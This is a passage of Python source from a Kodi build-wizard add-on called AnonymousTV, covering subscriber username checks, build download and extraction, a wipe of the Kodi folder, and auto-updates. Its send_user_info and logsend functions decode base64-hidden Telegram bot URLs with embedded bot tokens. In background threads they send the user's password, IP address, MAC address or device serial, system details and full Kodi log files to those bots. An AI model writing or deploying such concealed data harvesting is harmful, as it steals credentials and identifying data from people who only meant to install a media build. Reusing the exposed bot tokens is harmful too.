    search_entered=ADDON.getSetting("user")
    if not len(ADDON.getSetting("user"))>0 :
         if new_install=='true':
                if not KODIV >= 20: # קודי 20
                    DIALOG.ok(ADDONTITLE, 'ההתקנה זמינה מקודי 20 ומעלה' +'\n'+' גרסת הקודי שלך היא: '+str(KODIV)+'\n'+'עליך למחוק ולהתקין מחדש.')
                    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                    sys.exit()
                keyboard = xbmc.Keyboard(search_entered.lower(), 'הכנס שם משתמש')
                keyboard.doModal()
                if keyboard.isConfirmed():
                    search_entered = keyboard.getText()
                    wiz.setS("user",search_entered.lower())
                if search_entered=='':
                    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                    sys.exit()
                xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    search_entered=search_entered.lower()
    found=0
    # try:
        # remote_file = urlopen(ld(US))
        # x=remote_file.readlines()
    # except Exception as e:
        # x=''
        # logging.warning('לא מתחבר לשרת או שאין אינטרנט'  +str(e))
    
    # for us in x:
        # if us.decode('utf-8').split(' ==')[0] ==search_entered or us.decode('utf-8').split()[0]==search_entered:
            # found=1
            # if '@' in us.decode('utf-8'):
                    # wiz.setS("dragon","true")
                    # xbmc.executebuiltin("Skin.SetBool(homemenunocustom4button,false)")
            # else:
                    # wiz.setS("dragon","false")
                    # xbmc.executebuiltin("Skin.SetBool(homemenunocustom4button,true)")
            # try:
                # try:
                    # regex=' == (.+?) = '
                    # m=re.compile(regex).findall(us.decode('utf-8'))[0]
                    # wiz.setS("date_user",m.replace('@','').replace(' ',''))

                # except:
                    # regex=' == (.+?)\n'
                    # m=re.compile(regex).findall(us.decode('utf-8'))[0]
                    # wiz.setS("date_user",m.replace('@','').replace(' ',''))
            # except:
                # m=''
                # wiz.setS("date_user",m.replace('@','').replace(' ',''))
            # try:
                # try:
                    # regex2=' = (.+?) @ '
                    # sync=re.compile(regex2).findall(us.decode('utf-8'))[0]
                    # wiz.setS("pass2","true")
                # except:
                    # regex2=' = (.+?)\n'
                    # sync=re.compile(regex2).findall(us.decode('utf-8'))[0]
                    # wiz.setS("pass2","true")

            # except:
                # pass
            # break
    match=[]
    match2=[]
    try:
        all_db=read_skin('playback')
        all_db_dragon=read_skin_dragon('playback')
        ssss=[all_db,all_db_dragon]
        for i in ssss:
            for itt in i:
                items=i[itt]
                try:
                    match.append((items['name'],items['date'],items['sync'],items['dragon'],items['device'],items['rduser'],items['rdpass'],items['telegram_user'],items['p1'],items['p2'],items['p3']))
                except:
                    match2.append((items['name'],items['date'],items['sync'],items['dragon'],items['device']))
    except Exception as e:
              wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]תקלה - בדוק את חיבור האינטרנט[/COLOR]" % COLOR2,5000)
              logging.warning('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '  +str(e))
              xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
              sys.exit()
    for name,date,sync,dragon,device,rduser,rdpass,telegram_user,p1,p2,p3 in match:
        if name.split()[0].lower()==search_entered:
            found=1
            wiz.setS("date_user",date.replace(' ',''))
            wiz.setS("device",device.replace(' ',''))
            wiz.setS("rd_pass",rdpass.replace(' ',''))
            if len(rduser)>0 :
                wiz.setS('auto_rd','true')
            if '@' in dragon.replace(' ',''):
                    wiz.setS("dragon","true")
                    xbmc.executebuiltin("Skin.SetBool(homemenunocustom4button,false)")
            else:
                    wiz.setS("dragon","false")
                    xbmc.executebuiltin("Skin.SetBool(homemenunocustom4button,true)")
            break
    for name,date,sync,dragon,device in match2:
        if name.split()[0].lower()==search_entered:
            found=1
            wiz.setS("date_user",date.replace(' ',''))
            wiz.setS("device",device.replace(' ',''))
            if '@' in dragon.replace(' ',''):
                    wiz.setS("dragon","true")
            else:
                    wiz.setS("dragon","false")
            break
    if found==0:

            if BUILDNAME == "":
                thread=[]
                thread.append(Thread(send_user_info,'channel_new_install','שם משתמש שגוי - '+search_entered))
                thread[0].start()
                wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]שם המשתמש שגוי[/COLOR]" % COLOR2,1500)
                wiz.setS("user",'')
                xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                continuex=True
            if BUILDNAME == " Kodi Premium":
                wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]שם המשתמש שגוי[/COLOR]" % COLOR2,1500)
                xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                continuex=True
    check_userdate()
    check_platform()
    if continuex==True:
        sys.exit()
    else:
      if new_install=='true':
         check_pass()
    return 'ok'


def buildWizard(name, type, theme=None, over=False):
    title = '[COLOR gold]'+'AnonymousTV'+'[/COLOR]'
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    SetAddonDisables()
    if type == 'fresh':
            if not BUILDNAME == '':
                DIALOG         = xbmcgui.Dialog()
                choice = DIALOG.yesno(ADDONTITLE, "[COLOR %s]הבילד כבר מותקן, [COLOR %s]%s[/COLOR]האם תרצה להתקין אותו שוב?[/COLOR]" % (COLOR2, COLOR1, ''), yeslabel="[B]כן[/B]", nolabel="[B]לא[/B]")

                if choice == 0:
                    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                    sys.exit()
            check()
            STARTP(new_install = 'true')
            txt='מבקש אישור להתקין'
            thread=[]
            thread.append(Thread(send_user_info,'channel_new_install',txt))
            thread[0].start()
            
            try:
                buildzip =ld(get_link(code_link))
            except Exception as e:
                wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]התקנה הסתיימה בהצלחה.[/COLOR]' % COLOR2,1500)
                resetkodi()
                sys.exit()
            thread=[]
            thread.append(Thread(wiz.LogNotify,"[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתקנה מתחילה, אנא המתן...[/COLOR]' % COLOR2,1500))
            thread[0].start()
            
            txt='ההתקנה אושרה'
            thread=[]
            thread.append(Thread(send_user_info,'channel_new_install',txt))
            thread[0].start()
            try:
                freshStart(name)
            except Exception as e: 
                thread=[]
                thread.append(Thread(send_user_info,'channel_new_install',str(e)))
                thread[0].start()
                
            td_thread=[]
            td_thread.append(Thread(tdlib))
            zipname =  "Build.zip"
            if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
            DP.create(ADDONTITLE,'[B]Downloading[/B]'+'\n'+ 'Please Wait')
            lib=os.path.join(PACKAGES,zipname)
            try: os.remove(lib)
            except: pass
            try:
                downloader.download(buildzip, lib, DP)
            except Exception as e: 
                thread=[]
                thread.append(Thread(send_user_info,'channel_new_install',str(e)))
                thread[0].start()
                wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]לא ניתן להתקין - קיימת תקלה.[/COLOR]' % COLOR2,1500)
                xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                sys.exit()
            DP.update(0, title+'\n'+''+'\n'+ 'אנא המתן...')
            if DP.iscanceled():
             DP.close()
            percent, errors, error = extract.all(lib,HOME,DP, title=title)
            if int(float(percent)) > 0:
                fastupdatefirstbuild(NOTEID)
                set_fastupdate_date()
                wiz.setS('buildname', name)
                wiz.setS('lastbuildcheck', str(NEXTCHECK))
                skin_homeselect()
                # fix_gui()
                if wiz.getS('dragon')=='true':
                    skin_dragon_set()
                # if sys.platform.lower().startswith('darwin'):
                    # apple_settings()
                try: os.remove(lib)
                except: pass
                DP.close()
                my_system = platform.uname()
                xs=my_system[1]
                wiz.setS("platform_name",xs)
                backup_setting_file()

                for td in td_thread:
                  td.start()
                num_live=0
                stop_time = time.time() + 60
                while 1:
                  wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]מוריד קבצי הפעלה...[/COLOR]' % COLOR2,1500)
                  if time.time() > stop_time:
                     break
                  for threads in td_thread:
                    still_alive=0
                    num_live=0
                    for yy in range(0,len(td_thread)):
                        if not td_thread[yy].is_alive():
                          num_live=num_live+1
                        else:
                          still_alive=1
                  if still_alive==0:
                        break
                fix_gui()
                thread=[]
                txt='התקין'
                thread.append(Thread(send_user_info,'channel_install_is_done',txt))
                thread[0].start()
                thread=[]
                thread.append(Thread(wiz.LogNotify,"[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתקנה הסתיימה.[/COLOR]' % COLOR2,1500))
                thread[0].start()
                
                resetkodi()
            else:
                xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                thread=[]
                txt='ההתקנה לא זמינה כעת, נסו שוב מאוחר יותר'
                thread.append(Thread(send_user_info,'channel_new_install',txt))
                thread[0].start()
                DP.close()
                wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]ההתקנה אינה זמינה כעת, נסו שוב מאוחר יותר.[/COLOR]' % COLOR2,1500)
                sys.exit()

def freshStart(install=None, over=False):
    xbmcPath=os.path.abspath(HOME)
    DP.create(ADDONTITLE,'אנא המתן...')
    total_files = sum([len(files) for r, d, files in os.walk(xbmcPath)]); del_file = 0
    DP.update(0, "[COLOR %s]Gathering Excludes list." % COLOR2)
    EXCLUDES.append('My_Builds')
    EXCLUDES.append('archive_cache')
    EXCLUDES.append('plugin.video.elementum')
    EXCLUDES.append('script.elementum.burst')
    EXCLUDES.append('script.elementum.burst-master')
    EXCLUDES.append('skin.estuary')
    EXCLUDES.append('game.controller.default')
    EXCLUDES.append('game.controller.keyboard')
    EXCLUDES.append('game.controller.mouse')
    EXCLUDES.append('game.controller.snes')
    EXCLUDES.append('metadata.album.universal')
    EXCLUDES.append('metadata.artists.universal')
    EXCLUDES.append('metadata.common.fanart.tv')
    EXCLUDES.append('metadata.themoviedb.org.python')
    EXCLUDES.append('metadata.tvshows.themoviedb.org.python')
    EXCLUDES.append('service.xbmc.versioncheck')
    
    DP.update(0, "[COLOR yellow]מנקה קבצים ותיקיות, אנא המתן...[/COLOR]")
    latestAddonDB = wiz.latestDB('Addons')
    for root, dirs, files in os.walk(xbmcPath,topdown=True):
        dirs[:] = [d for d in dirs if d not in EXCLUDES]
        for name in files:
            del_file += 1
            fold = root.replace('/','\\').split('\\')

            x = len(fold)-1

            if name.endswith('.db'):
                try:
                    if name == latestAddonDB and KODIV >= 17: wiz.log("Ignoring %s on v%s" % (name, KODIV), 5)
                    else: os.remove(os.path.join(root,name))
                except Exception as e: 
                    if not name.startswith('Textures13'):
                        wiz.log('Failed to delete, Purging DB', 5)
                        wiz.log("-> %s" % (str(e)), 5)
                        wiz.purgeDb(os.path.join(root,name))
            else:

                try: os.remove(os.path.join(root,name))
                except Exception as e: 
                    wiz.log("Error removing %s" % os.path.join(root, name), 5)
                    wiz.log("-> / %s" % (str(e)), 5)
        if DP.iscanceled(): 
            DP.close()
            xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
            wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]ההתקנה מבוטלת[/COLOR]" % COLOR2,1500)
            sys.exit()
            return False
    for root, dirs, files in os.walk(xbmcPath,topdown=True):
        dirs[:] = [d for d in dirs if d not in EXCLUDES]
        for name in dirs:

          DP.update(100, 'Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]' % (COLOR1, name))
          if name not in ["Database","userdata","temp","addons","addon_data"]:
             shutil.rmtree(os.path.join(root,name),ignore_errors=True, onerror=None)
        if DP.iscanceled(): 
            DP.close()
            wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]ההתקנה מבוטלת.[/COLOR]" % COLOR2,1500)
            sys.exit()
    DP.close()


def help_install():
    import webbrowser
    if xbmc.getCondVisibility('system.platform.windows'):
        webbrowser.open('https://t.me/xbmc19')
    else:
        url='https://t.me/xbmc19'
        xbmc.executebuiltin("StartAndroidActivity(com.android.browser,android.intent.action.VIEW,,"+url+")")
        xbmc.executebuiltin("StartAndroidActivity(com.android.chrome,,,"+url+")") 
        xbmc.executebuiltin("StartAndroidActivity(org.mozilla.firefox,android.intent.action.VIEW,,"+url+")")    
        xbmc.executebuiltin("StartAndroidActivity(org.sec.android.app.sbrowser,android.intent.action.VIEW,,"+url+")")    

def fastupdatefirstbuild(NOTEID):
    try:
        checkidupdate()
        thread=[]
        txt='מעודכן לגירסה האחרונה'
        thread.append(Thread(send_user_info,'channel_install_is_done',txt))
        thread[0].start()
    except Exception as e: 
        logging.warning('בעיה בעדכון המהיר======================================')
        logging.warning(str(e))
        wiz.setS("notedismiss","false")
        thread=[]
        thread.append(Thread(send_user_info,'howsentlog','בעיה בהורדת עדכון מערכת בהתקנה חדשה: '+str(e)))
        thread[0].start()
    id, msg = wiz.splitNotify(NOTIFICATION)
    if not id == False:
        try:
            id = int(id); NOTEID = int(NOTEID)
            # checkidupdate()
            wiz.setS("notedismiss","true")
            if id == NOTEID:
                wiz.log("[Notifications] id[%s] Dismissed" % int(id), 5)

            elif id > NOTEID:
                wiz.log("[Notifications] id: %s" % str(id), 5)
                wiz.setS('noteid', str(id))
                wiz.setS("notedismiss","true")
#						notify.notification(msg=msg)
                wiz.log("[Notifications] Complete", 5)
        except Exception as e:
            wiz.setS("notedismiss","false")
            wiz.log("Error on Notifications Window: %s" % str(e), 5)
            thread=[]
            thread.append(Thread(send_user_info,'howsentlog','בעיה בהורדת עדכון מערכת: '+str(e)))
            thread[0].start()
def checkidupdate():
    name =  "Last Update"
    zipname =  "Update.zip"
    if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
    DP.create(ADDONTITLE,'[COLOR %s][B]מוריד עדכון אחרון[/B][/COLOR][COLOR %s][/COLOR]' % (COLOR1, name))
    lib=os.path.join(PACKAGES,zipname)
    downloader.download(ld(BL), lib, DP)
    xbmc.sleep(100)
    namex= 'עדכון אחרון'
    title = '[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, namex)
    DP.update(0, title+'\n'+''+'\n'+ 'אנא המתן')
    extract.all(lib,HOME,DP, title=title)
    DP.close()
    try: os.remove(lib)
    except: pass
    wiz.setS("notedismiss","true")
def logsend():
    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]שולח לוג אנא המתן[/COLOR]' % COLOR2,1500)
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    send_user_info('channel_install_is_done','שלח לוג - לפני התקנה חדשה')
    import requests
    files=''
    docu=translatepath('special://logpath/kodi.log')
    files = {
    'chat_id': (None, '-1001415871797'),#-274262389
    'document': (open(docu, 'rb')),
    }
    t=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kRG9jdW1lbnQ=').decode('utf-8')
    response = requests.post(t, files=files)
    try:
        docu_old=translatepath('special://logpath/kodi.old.log')
        files_old = {
        'chat_id': (None, '-1001415871797'),#-274262389
        'document': (open(docu_old, 'rb')),
        }
        response = requests.post(t, files=files_old)
    except:pass
    xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]' % COLOR2,1500)
def make_setting_file():
    try:
        setting_file=os.path.join(translatepath("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")
        setting_file2=os.path.join(translatepath("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")
        # try:

        file = open(setting_file, 'r', encoding='utf-8') 
        file_data= file.read()
        file.close()
        if file_data =='':
                copyfile(setting_file2,setting_file)
                xbmc.sleep(500)
                send_user_info('channel_block_build','קובץ הגדרות תוקן')
    except:pass
def checkidupdatetele(info=''):
    remove_addons()
    zipname =  "Update.zip"
    if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
    lib=os.path.join(PACKAGES, zipname )
    downloader.download_update(ld(BL), lib, DP2)
    xbmc.sleep(100)
    DP2.create('[B][COLOR=green]מתקין                         [/COLOR][/B]')
    DP2.update(100, message='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')
    extract.all2(lib,HOME,DP2)
    DP2.close()
    wiz.kodi17Fix()
    wiz.setS("notedismiss","true")
    backup_setting_file()
    ver=get_version_update()
    try: os.remove(lib)
    except: pass
    

    if not wiz.getS('ver')==ver or info=='ידני: ':
        thread=[]
        thread.append(Thread(send_user_info('channel_fast_update','עדכון מערכת: '+info)))
        thread[0].start()
        wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]המערכת עודכנה בהצלחה![/COLOR]' % COLOR2,1500)
        infobuild(True)
        wiz.setS('ver',ver)
        remote_file = urlopen(reset_kodi_update)
        x=remote_file.readlines()
        for us in x:
            if us.decode('utf-8')=="reset_on":
                resetkodi()
    else:
        wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הושלם.[/COLOR]' % COLOR2,1500)
        thread=[]
        thread.append(Thread(send_user_info('channel_fast_update','עדכון מערכת ברקע: '+info)))
        thread[0].start()
def force_update():
    DIALOG         = xbmcgui.Dialog()
    if  KODIV >= 20: # קודי 20

        choice = DIALOG.yesno(ADDONTITLE, "האם לבצע עדכון מערכת?", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
        if choice == 1:
            xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
            if STARTP() =='ok':
                xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
                xbmc.executebuiltin( "ActivateWindow(home)" )
                id, msg = wiz.splitNotify(NOTIFICATION)
                wiz.setS('noteid', str(id))
                wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]מוריד עדכון[/COLOR]" % COLOR2,1500)
                try:
                    checkidupdatetele('ידני: ')
                except Exception as e:
                    wiz.setS('notedismiss', 'false')
                    thread=[]
                    thread.append(Thread(send_user_info,'howsentlog','בעיה בהורדת עדכון מערכת ידני: '+str(e)))
                    thread[0].start()
                    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]עדכון המערכת נכשל.[/COLOR]' % COLOR2,1500)
    else:
        DIALOG.ok(ADDONTITLE, 'העדכון תומך רק מקודי 20 ומעלה' +'\n'+' גרסת הקודי שלך היא: '+str(KODIV)+'\n'+'עליך למחוק ולהתקין מחדש.')
        # sys.exit()


def auto_build_update(NOTEID):
    counter_ten=10
    while(counter_ten)>0:
        counter_ten-=1
        time.sleep(1)
    try:
        clearPackagesStartup()
    except:pass
    x=xbmc.executebuiltin("UpdateLocalAddons")
    x=xbmc.executebuiltin("UpdateAddonRepos")
    if not xbmc.Player().isPlaying():
        if BUILDNAME == " Kodi Premium" or os.path.exists(translatepath("special://home/addons/") + 'skin.Premium.mod')or os.path.exists(translatepath("special://home/addons/") + 'skin.anonymoustv'):
            wiz.wizardUpdate('startup')
            if STARTP() =='ok':
                # check()
                if not NOTIFY == 'true':
                    # url = wiz.workingURL(NOTIFICATION)
                    # if url == True:
                    id, msg = wiz.splitNotify(NOTIFICATION)
                    if not id == False:
                        try:
                            id = int(id); NOTEID = int(NOTEID)
                            if id == NOTEID:
                                if NOTEDISMISS == 'false':
                                    checkidupdatetele('אוטומטי: ')# notify.notification(msg)
                                else: wiz.log("[Notifications] id[%s] Dismissed" % int(id), 5)
                            elif id > NOTEID:

                                wiz.setS('noteid', str(id))
                                wiz.setS('notedismiss', 'false')
                                checkidupdatetele('אוטומטי: ')

                        except Exception as e:
                            wiz.log("Error on Notifications Window: %s" % str(e), 5)
                            wiz.setS('notedismiss', 'false')
                            wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]עדכון המערכת נכשל.[/COLOR]' % COLOR2,1500)
                            thread=[]
                            thread.append(Thread(send_user_info,'howsentlog','בעיה בהורדת עדכון מערכת אוטומטי: '+str(e)))
                            thread[0].start()
def get_pincode(code_link):
    #VIP
    stop_time = time.time() + 300
    while(code_link=='empty' or code_link==None):
          wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Dragon'),'[COLOR %s]המתן לתגובה מ Dragon[/COLOR]' % COLOR2,1500)
          code_link=telecode()
          if time.time() > stop_time:
            code_link='play_tele'
    return code_link



def infobuild(test=''):

    try:
        id, msg = wiz.splitNotify(NOTIFICATION)
        if id == False: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2,1500); return
        notify.updateinfo(msg, test)
    except Exception as e:
        wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון מהיר[/COLOR]" % COLOR2,1500)
def infoupdate_busydialog(test=''):
    try:
        xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
        id, msg = wiz.splitNotify(NOTIFICATION)
        notify.updateinfo(msg, test)
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
    except Exception as e:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
        wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין מידע[/COLOR]" % COLOR2,1500)

def send_user_info(mod='',txt=''):
    # try:
      import requests,platform
      userr= wiz.getS("user").lower()
      passs= wiz.getS("pass")
      update= wiz.getS("update")
      userdate=wiz.getS("date_user")
      rd= wiz.getS("rd_info")
      tele= wiz.getS("tele_info")
      id_name=''
      id_device=''
      serialnumber=''
      device_cunt=0
      device_backup_name=wiz.getS("device_backup_name")
      if wiz.getS("device_backup")=='true':
        device_backup= 'גיבוי מערכת: פעיל - ' + ' שם הגיבוי הוא: ' + device_backup_name
      else:
        device_backup='גיבוי מערכת: לא פעיל'
      kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
      if 'howsentlog'==mod:#שלח לוג

            error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxOTUzMTA4MTUxJnRleHQ9').decode('utf-8')
      if 'channel_new_install'==mod:#ערוץ התקנות חדשות
            # txt='מנסים להתקין'  # txt='שלח קוד' # txt='ההתקנה לא זמינה כעת, נסו שוב מאוחר יותר' # txt='חסימה על ידי: ' # txt='מבקש אישור להתקין' # txt='ההתקנה אושרה' # txt='לחץ על החשבון שלי'
          if wiz.getS('dragon')=='true':
            error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode('utf-8')
          else:
            error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')
      if 'channel_fast_update'==mod:#ערוץ עדכון מהיר
          # txt='עדכון מהיר'
          # txt='שלח לוג'
          if wiz.getS('dragon')=='true':
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU4MDUzMzM1NzpBQUVzTjZPLU5QN05IU1B0eHc2UTZpVnVEa2dhZU1aUU1nOC9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNTcwNzQ3MjI0JnRleHQ9').decode('utf-8')
          else:
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode('utf-8')
      if 'channel_install_is_done'==mod:#ערוץ התקנה הסתיימה
          if wiz.getS('dragon')=='true':
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode('utf-8')
          else:
                error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ9').decode('utf-8')

      if 'channel_block_build'==mod:#ערוץ בילד נחסם
          #'מנוי עומד להסתיים'
          #'ניסיון העתקה - מנוי ננעל'
          #' מנוי הסתיים - התקנה פעילה '
          #'מנוי ננעל'
          #'מנוי הסתיים - התקנה חדשה'
          if wiz.getS('dragon')=='true':
            error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDQzMjU2NjE1MTpBQUdhUUxkWm90dFQyYUZHNFpRQ19JeUFHcFJyZ0phN3d6SS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNTUxMTkwOTY0JnRleHQ9').decode('utf-8')
          else:
            error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUwNjAyNjcwNTE6QUFIQWl5bFNENGREYzlWeGtncjJXc2o3WHhkV3FvTUhVX00vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTY2NTgwNTE0OCZ0ZXh0PQ==').decode('utf-8')
      try:
        local_ip=requests.get('http://api.ipaddress.com/myip', verify=False).text.strip()
      except:
        local_ip="can't get ip"
      if xbmc.getCondVisibility('system.platform.android'):
        try:
            model=subprocess.check_output(['getprop','ro.product.model'])[:-1]
            
            id_name=que('סוג מכשיר: ')+str(model.decode('utf-8'))
            x=subprocess.check_output(['getprop'])[:-1]

            regex='\[([0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F]:[0-9a-fA-F][0-9a-fA-F])\]'
            m=re.compile(regex).findall(x.decode('utf-8'))
            serialnumber=str(m).replace('[','').replace(']','').replace("'",'')

            if serialnumber =='' or serialnumber =='00:00:00:00:00:00':

                serialnumber=subprocess.check_output(['getprop','ril.serialnumber'])[:-1].decode('utf-8')
                if serialnumber =='':
                    serialnumber=subprocess.check_output(['getprop','ro.serialno'])[:-1].decode('utf-8')
                if serialnumber =='':
                    digest=subprocess.check_output(['getprop','ro.boot.vbmeta.digest'])[:-1]
                    m = hashlib.md5()
                    m.update(digest)
                    serialnumber='R'+str(int(m.hexdigest(), 16))[0:12]
            id_device=que('מזהה id: ')+str(serialnumber)
            serialnumber=userr+' '+str(model.decode('utf-8'))+': '+str(serialnumber)
        except Exception as e:
            logging.warning('32323232323232323 '+str(e))
      else:
              serialnumber = platform.uname()[1]

              id_name=que('שם המערכת: ')+serialnumber
              serialnumber=userr+' '+'pc: '+str(serialnumber)
      from resources.default import read_device
      device_name=read_device('playback')
      for items in device_name:
         
        if len(userr)>0 and userr == device_name[items]['device_name'].partition(' ')[0]:

            device_cunt+=1
      proxies = {'Socks4': '173.212.227.160:43034'}
      
      try:
          if 'מזהה מכשיר' not in txt:
            x=requests.get(error_ad+que(txt)+'\n'+que('שם משתמש: #')+userr+'\n'+que('קוד מכשיר: ')+(wiz.getS('action'))+'\n'+que('סיסמה: ')+passs+'\n'+que('מנוי: ')+userdate+'\n'+que('כמות מכשירים: ')+str(device_cunt)+'\n'+que('קודי: ')+kodiinfo+'\n'+que('כתובת: ')+local_ip+'\n'+que('מערכת הפעלה: ')+platform_d()+'\n'+id_name+'\n'+id_device+'\n'+que('גירסת ויזארד: ')+VERSION+'\n'+device_backup+'\n'+update+'\n'+rd+'\n'+tele).json()
          if 'בקשה לפתיחת תוכן טורקי ' in txt:
            if wiz.getS('dragon')=='true':
                x=requests.get(error_ad + '@@@'+txt.replace('בקשה לפתיחת תוכן טורקי ','')).json()
          if 'התקנה חדשה - קוד מכשיר:' in txt:
                x=requests.get(error_ad + txt.replace('התקנה חדשה - קוד מכשיר:','')).json()
          if 'התקנה חדשה' == txt:
                x=requests.get(error_ad+wiz.getS('action')).json()
          if 'no_code' == txt:
                x=requests.get(error_ad+que('no_code')).json()
          if 'מזהה מכשיר' in txt:

                x=requests.get(error_ad+serialnumber.lower()).json()
          if 'מעוניין לרשום מכשיר' in txt:
                x=requests.get(error_ad+serialnumber.lower()).json()
      except:
          if 'מזהה מכשיר' not in txt:
